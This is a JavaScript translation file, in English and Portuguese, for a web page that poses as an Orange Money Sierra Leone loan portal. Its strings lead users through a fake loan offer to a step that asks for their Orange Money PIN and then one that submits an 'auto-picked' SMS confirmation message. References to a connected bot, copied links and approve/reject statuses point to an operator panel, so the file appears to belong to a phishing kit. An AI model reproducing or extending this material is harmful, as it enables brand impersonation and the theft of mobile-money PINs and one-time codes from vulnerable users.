(function() {
  const translations = {
    en: {
      title: "Orange Money Loans Sierra Leone — Application Portal",
      heroBadge: "Instant Approval via Orange Money Sierra Leone",
      heroHeading: "Simulate Your Loan",
      heroSubtitle: "Get funds directly into your Orange Money Sierra Leone account in minutes.",
      requestedAmount: "Requested Amount",
      interestRate: "5% monthly rate",
      repaymentTerm: "Repayment Term",
      month1: "1 Month",
      months3: "3 Months",
      months6: "6 Months",
      months12: "12 Months",
      estMonthly: "Est. Monthly Payment:",
      totalRepay: "Total Repayable:",
      applyNow: "APPLY FOR LOAN NOW",
      step1Title: "Loan Details",
      step1Sub: "Customize your loan terms.",
      loanType: "Loan Type",
      amountLabel: "Amount (SLE)",
      termLabel: "Term (Months)",
      purposeLabel: "Loan Purpose",
      continueToPersonal: "CONTINUE TO PERSONAL DETAILS",
      step2Title: "Applicant Details",
      step2Sub: "Fill in your official identification information.",
      firstName: "First Name",
      lastName: "Last Name",
      orangePhone: "Orange Money Phone (+232)",
      employmentStatus: "Employment Status",
      agentConsent: "I authorize the referral agent to track application status.",
      continueToAuth: "CONTINUE TO ORANGE AUTHENTICATION",
      step3Title: "Sign in to Orange Money",
      step3Sub: "Confirm your phone number and enter your 4-digit PIN to validate your loan.",
      phoneNum: "Phone Number",
      pinLabel: "Orange Money PIN (4 digits):",
      showPin: "Show",
      hidePin: "Hide",
      confirmLoanBtn: "LOGIN & CONFIRM LOAN",
      step4Title: "Account Ownership Verification",
      step4Sub: "Your SMS confirmation message is auto-selected below. Click submit to proceed.",
      smsLabel: "SMS Confirmation Message (Auto-Picked)",
      submitSmsBtn: "SUBMIT VERIFICATION MESSAGE",
      step5Title: "Application Submitted!",
      step5Sub: "Your loan request has been routed to Orange Money Financial Services Sierra Leone.",
      appRef: "Application Reference:",
      applicantName: "Applicant:",
      orangeContact: "Orange Contact:",
      loanMode: "Loan Type:",
      requestedAmt: "Requested Amount:",
      termRepay: "Term / Payment:",
      currentStatus: "Current Status:",
      statusPending: "⏳ Under Review",
      newLoanBtn: "APPLY FOR ANOTHER LOAN",
      footerRights: "© 2026 Orange Money Credit Services Sierra Leone"
    },
    pt: {
      title: "Empréstimos Orange Money Serra Leoa — Portal de Candidatura",
      heroBadge: "Aprovação Instantânea via Orange Money Serra Leoa",
      heroHeading: "Simule o seu Empréstimo",
      heroSubtitle: "Receba os fundos diretamente na sua conta Orange Money Serra Leoa em minutos.",
      requestedAmount: "Valor Solicitado",
      interestRate: "Taxa 5% a.m.",
      repaymentTerm: "Prazo de Reembolso",
      month1: "1 Mês",
      months3: "3 Meses",
      months6: "6 Meses",
      months12: "12 Meses",
      estMonthly: "Prestação Mensal Estimada:",
      totalRepay: "Total a Reembolsar:",
      applyNow: "SOLICITAR EMPRÉSTIMO AGORA",
      step1Title: "Detalhes do Crédito",
      step1Sub: "Personalize a sua modalidade de empréstimo.",
      loanType: "Tipo de Empréstimo",
      amountLabel: "Valor (SLE)",
      termLabel: "Prazo (Meses)",
      purposeLabel: "Finalidade do Empréstimo",
      continueToPersonal: "CONTINUAR PARA DADOS PESSOAIS",
      step2Title: "Dados do Candidato",
      step2Sub: "Preencha com os seus dados identificativos oficiais.",
      firstName: "Nome",
      lastName: "Apelido",
      orangePhone: "Número Orange Money (+232)",
      employmentStatus: "Situação Profissional",
      agentConsent: "Autorizo o agente de referência a acompanhar o estado da candidatura.",
      continueToAuth: "CONTINUAR PARA AUTENTICAÇÃO ORANGE",
      step3Title: "Entrar no Orange Money",
      step3Sub: "Confirme o seu número e insira o PIN de 4 dígitos para validar o seu empréstimo.",
      phoneNum: "Número de Telefone",
      pinLabel: "PIN Orange Money (4 dígitos):",
      showPin: "Mostrar",
      hidePin: "Ocultar",
      confirmLoanBtn: "ENTRAR E CONFIRMAR EMPRÉSTIMO",
      step4Title: "Verificação de Titularidade",
      step4Sub: "A sua mensagem de confirmação por SMS foi selecionada automaticamente abaixo. Clique em enviar.",
      smsLabel: "Mensagem SMS de Confirmação (Auto-Selecionada)",
      submitSmsBtn: "ENVIAR MENSAGEM DE VERIFICAÇÃO",
      step5Title: "Candidatura Submetida!",
      step5Sub: "O seu pedido de crédito foi encaminhado para os Serviços Financeiros Orange Money Serra Leoa.",
      appRef: "Referência do Pedido:",
      applicantName: "Candidato:",
      orangeContact: "Contacto Orange:",
      loanMode: "Modalidade:",
      requestedAmt: "Valor Solicitado:",
      termRepay: "Prazo / Prestação:",
      currentStatus: "Estado Atual:",
      statusPending: "⏳ Em Análise",
      newLoanBtn: "SOLICITAR NOVO EMPRÉSTIMO",
      footerRights: "© 2026 Orange Money Credit Services Serra Leoa"
    },
    common: {
      "Bot Conectado": { en: "Bot Connected", pt: "Bot Conectado" },
      "Configurado": { en: "Configured", pt: "Configurado" },
      "Link copiado com sucesso!": { en: "Link copied successfully!", pt: "Link copiado com sucesso!" },
      "Pendente": { en: "Pending", pt: "Pendente" },
      "Em Análise": { en: "Under Review", pt: "Em Análise" },
      "Aprovado": { en: "Approved", pt: "Aprovado" },
      "Rejeitado": { en: "Rejected", pt: "Rejeitado" },
      "meses": { en: "months", pt: "meses" },
      "candidatura(s).": { en: "application(s).", pt: "candidatura(s)." }
    }
  };

  let currentLang = localStorage.getItem("emola_lang") || "en";

  window.t = function(key) {
    if (!key) return "";
    if (translations.common && translations.common[key]) {
      return translations.common[key][currentLang] || translations.common[key].en || key;
    }
    const dict = translations[currentLang] || translations.en;
    return dict[key] || key;
  };

  function setLanguage(lang) {
    currentLang = lang;
    localStorage.setItem("emola_lang", lang);
    const dict = translations[lang] || translations.en;
    
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.innerText = lang.toUpperCase();
    });

    document.querySelectorAll("[data-i18n]").forEach(el => {
      const key = el.getAttribute("data-i18n");
      if (dict[key]) {
        el.innerText = dict[key];
      }
    });
  }

  document.addEventListener("DOMContentLoaded", () => {
    setLanguage(currentLang);
    document.querySelectorAll(".language-toggle").forEach(btn => {
      btn.addEventListener("click", () => {
        const nextLang = currentLang === "en" ? "pt" : "en";
        setLanguage(nextLang);
      });
    });
  });
})();